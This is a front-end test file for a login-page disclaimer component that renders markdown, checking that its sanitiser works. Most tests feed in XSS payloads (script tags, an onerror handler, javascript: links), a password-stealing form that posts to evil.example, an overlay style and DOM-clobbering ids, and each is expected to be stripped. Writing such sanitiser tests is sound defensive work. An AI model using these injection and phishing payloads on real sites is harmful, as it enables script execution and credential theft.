import { createTheme, ThemeProvider } from '@mui/material/styles';
import { render, screen } from '@testing-library/react';
import React, { type ReactNode } from 'react';
import { describe, expect, it, vi } from 'vitest';

import LoginDisclaimer from './LoginDisclaimer';

vi.mock('lib/globalize', () => ({
    default: {
        translate: (key: string) => `translated:${key}`
    }
}));

const theme = createTheme({ cssVariables: true });
const NEW_WINDOW_HINT = 'translated:OpensInNewWindow';

const renderWithTheme = (ui: ReactNode) => render(
    <ThemeProvider theme={theme}>{ui}</ThemeProvider>
);

describe('LoginDisclaimer', () => {
    it.each([
        [ 'undefined', undefined ],
        [ 'null', null ],
        [ 'empty', '' ]
    ])('renders nothing when the disclaimer is %s', (_, markdown) => {
        const { container } = renderWithTheme(<LoginDisclaimer markdown={markdown} />);

        expect(container).toBeEmptyDOMElement();
    });

    it('renders the markdown', () => {
        renderWithTheme(<LoginDisclaimer markdown={'# Welcome\n\nPlease **behave**'} />);

        expect(screen.getByRole('heading', { name: 'Welcome' })).toBeInTheDocument();
        expect(screen.getByText('behave').tagName).toBe('STRONG');
    });

    it('shifts headings down a level so the page keeps its own h1', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer
                markdown={'# One\n\n## Two\n\n##### Five\n\n###### Six\n\n<h3 id="raw" class="fancy">Raw <a href="https://example.com">link</a></h3>'}
            />
        );

        expect(screen.getByRole('heading', { name: 'One' })).toHaveProperty('tagName', 'H2');
        expect(screen.getByRole('heading', { name: 'Two' })).toHaveProperty('tagName', 'H3');
        expect(screen.getByRole('heading', { name: 'Five' })).toHaveProperty('tagName', 'H6');
        // There is no level below six
        expect(screen.getByRole('heading', { name: 'Six' })).toHaveProperty('tagName', 'H6');
        expect(container.querySelector('h1')).toBeNull();

        // Raw html headings are shifted too, keeping their sanitized attributes and content
        const raw = screen.getByRole('heading', { name: /^Raw link/ });
        expect(raw).toHaveProperty('tagName', 'H4');
        expect(raw).toHaveAttribute('id', 'user-content-raw');
        expect(raw).toHaveClass('fancy');
        expect(screen.getByRole('link', { name: /^link/ })).toHaveAttribute('target', '_blank');
    });

    it('removes scripts and event handlers', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer
                markdown={'<script>window.pwned = true</script>\n\n<img src="x" onerror="window.pwned = true" alt="logo">'}
            />
        );

        expect(container.querySelector('script')).toBeNull();
        const image = screen.getByRole('img', { name: 'logo' });
        expect(image).not.toHaveAttribute('onerror');
        expect(container.innerHTML).not.toContain('pwned');
    });

    it('removes javascript links', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer markdown={'<a href="javascript:alert(1)">html</a> [markdown](javascript:alert(1))'} />
        );

        expect(screen.getByText('html')).not.toHaveAttribute('href');
        // markdown-it does not create links for javascript: urls
        expect(screen.queryByRole('link', { name: 'markdown' })).not.toBeInTheDocument();
        expect(container.querySelector('[href]')).toBeNull();
    });

    it('removes forms and inputs', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer
                markdown={'<form action="https://evil.example/steal" method="post"><input type="password" name="pw"><button type="submit">Sign in</button><textarea></textarea><select><option>a</option></select></form>'}
            />
        );

        for (const tag of [ 'form', 'input', 'button', 'textarea', 'select', 'option' ]) {
            expect(container.querySelector(tag)).toBeNull();
        }
        expect(container.innerHTML).not.toContain('evil.example');
    });

    it('removes styles', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer
                markdown={'<style>body { display: none }</style>\n\n<p style="position: fixed; inset: 0">Overlay</p>'}
            />
        );

        expect(container.querySelector('style')).toBeNull();
        expect(screen.getByText('Overlay')).not.toHaveAttribute('style');
        expect(container.innerHTML).not.toContain('display: none');
    });

    it('prefixes ids and names to prevent DOM clobbering', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer markdown={'<a id="NativeShell" name="appHost" href="/help">Help</a>'} />
        );

        const link = screen.getByRole('link', { name: /^Help/ });
        expect(link).toHaveAttribute('id', 'user-content-NativeShell');
        expect(link).toHaveAttribute('name', 'user-content-appHost');
        expect(container.querySelector('#NativeShell')).toBeNull();
        expect('NativeShell' in window).toBe(false);
        expect('appHost' in window).toBe(false);
    });

    it('opens links in a new window and says so to assistive technology', () => {
        const { container } = renderWithTheme(
            <LoginDisclaimer
                markdown={'[Terms](https://example.com/terms) <a href="/help">Help</a> <a id="anchor">Anchor</a> '
                    + '<a href="#anchor">Top</a> <a href="mailto:admin@example.com">Mail</a>'}
            />
        );

        for (const name of [ 'Terms', 'Help' ]) {
            // The hint is part of the accessible name, separated from the link text
            const link = screen.getByRole('link', { name: `${name} ${NEW_WINDOW_HINT}` });
            expect(link).toHaveAttribute('target', '_blank');
            expect(link).toHaveAttribute('rel', 'noopener noreferrer');
            // The hint is hidden visually, as a tiny box rather than one as large as the container
            expect(link.querySelector('span')).toHaveStyle({
                position: 'absolute',
                clipPath: 'inset(50%)',
                width: '1px',
                height: '1px',
                margin: '-1px'
            });
            // The hint is not a stray text node, and not a forbidden inline style
            expect(link.querySelector('span')).not.toHaveAttribute('style');
        }
        expect(screen.getByRole('link', { name: /^Terms/ })).toHaveAttribute('href', 'https://example.com/terms');

        // Links within the page and links handed to another application stay as they are
        for (const name of [ 'Top', 'Mail' ]) {
            const link = screen.getByRole('link', { name });
            expect(link).toHaveTextContent(new RegExp(`^${name}$`));
            expect(link).not.toHaveAttribute('target');
        }

        // An anchor without a destination does not open anything
        const anchor = container.querySelector('#user-content-anchor');
        expect(anchor).toHaveTextContent(/^Anchor$/);
        expect(anchor).not.toHaveAttribute('target');
    });
});
